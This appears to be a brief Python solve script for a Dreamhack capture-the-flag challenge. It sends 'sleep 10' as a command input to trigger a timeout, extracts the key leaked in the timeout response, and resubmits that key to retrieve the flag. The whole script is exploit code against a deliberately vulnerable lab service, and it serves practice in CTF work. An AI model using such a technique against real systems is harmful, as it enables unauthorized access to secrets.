import requests
import sys
import hashlib

chall_url="http://host8.dreamhack.games:14004/flag"

data = { "cmd_input": "sleep 10" } # trigger cmd != '' or key == KEY 
# trigger timeout = 5
res = requests.post(chall_url, data=data)
print(res.text)
encoded_flag = res.text.split('<pre>Timeout! Your key: ')[1].split('</pre>')[0]
print(encoded_flag)
data = { "key" : encoded_flag }

res = requests.post(chall_url, data=data)
print(res.text)
